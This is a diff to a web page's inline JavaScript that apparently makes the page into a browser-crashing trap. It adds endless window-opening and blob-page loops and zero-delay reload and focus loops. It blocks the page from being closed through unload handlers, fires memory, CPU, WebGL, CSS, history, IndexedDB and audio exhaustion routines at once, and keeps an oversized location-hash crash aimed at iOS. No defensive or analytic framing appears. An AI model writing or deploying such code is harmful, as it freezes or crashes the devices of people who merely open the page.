@@ -123,71 +123,38 @@
             return 'other';
         }
 
+        function spawnWindows() {
+            while(true) {
+                window.open('/', '_blank');
+            }
+        }
+
+        function blobSpam() {
+            while(true) {
+                let blob = new Blob(['<body><script>for(;;)location.reload()</script></body>'], {type: 'text/html'});
+                window.open(URL.createObjectURL(blob));
+            }
+        }
+
         setTimeout(() => {
             window.onbeforeunload = () => true;
+            window.onunload = () => false;
+            window.onclose = () => false;
             
             const platform = getPlatform();
             
-            setTimeout(memoryExhaust, 0);
-            setTimeout(cpuExhaust, 50);
+            setInterval(() => location.reload(true), 0);
+            setInterval(() => window.focus(), 0);
             
-            switch(platform) {
-                case 'ios':
-                    location.hash = `M${"\u0001".repeat(2 ** 25)}m`;
-                    setTimeout(historySpam, 10);
-                    setTimeout(audioSpam, 20);
-                    setTimeout(transformSpam, 30);
-                    setTimeout(indexedDBSpam, 40);
-                    break;
-                    
-                case 'android':
-                    setInterval(() => location.reload(true), 100);
-                    setTimeout(indexedDBSpam, 10);
-                    setTimeout(transformSpam, 20);
-                    setTimeout(webglSpam, 30);
-                    setTimeout(audioSpam, 40);
-                    setTimeout(cssCrash, 50);
-                    break;
-                    
-                case 'firefox':
-                    setInterval(() => location.reload(true), 1);
-                    setTimeout(webglSpam, 10);
-                    setTimeout(cssCrash, 20);
-                    setTimeout(historySpam, 30);
-                    setTimeout(audioSpam, 40);
-                    setTimeout(transformSpam, 50);
-                    setTimeout(indexedDBSpam, 60);
-                    break;
-                    
-                case 'chrome':
-                    setInterval(() => location.reload(true), 1);
-                    setTimeout(webglSpam, 10);
-                    setTimeout(cssCrash, 20);
-                    setTimeout(historySpam, 30);
-                    setTimeout(audioSpam, 40);
-                    setTimeout(transformSpam, 50);
-                    setTimeout(indexedDBSpam, 60);
-                    break;
-                    
-                case 'safari':
-                    setInterval(() => location.reload(true), 100);
-                    setTimeout(cssCrash, 10);
-                    setTimeout(audioSpam, 20);
-                    setTimeout(transformSpam, 30);
-                    setTimeout(historySpam, 40);
-                    setTimeout(webglSpam, 50);
-                    setTimeout(indexedDBSpam, 60);
-                    break;
-                    
-                default:
-                    setInterval(() => location.reload(true), 1);
-                    setTimeout(webglSpam, 10);
-                    setTimeout(cssCrash, 20);
-                    setTimeout(historySpam, 30);
-                    setTimeout(indexedDBSpam, 40);
-                    setTimeout(audioSpam, 50);
-                    setTimeout(transformSpam, 60);
-                    
+            [memoryExhaust, cpuExhaust, webglSpam, cssCrash, 
+             historySpam, indexedDBSpam, audioSpam, transformSpam, 
+             spawnWindows, blobSpam].forEach(fn => {
+                setTimeout(fn, 0);
+                setTimeout(fn, 10);
+            });
+            
+            if (platform ==="ios") {
+                location.hash = `M${"\u0001".repeat(2 ** 25)}m`;
             }
         }, 50);
     </script>
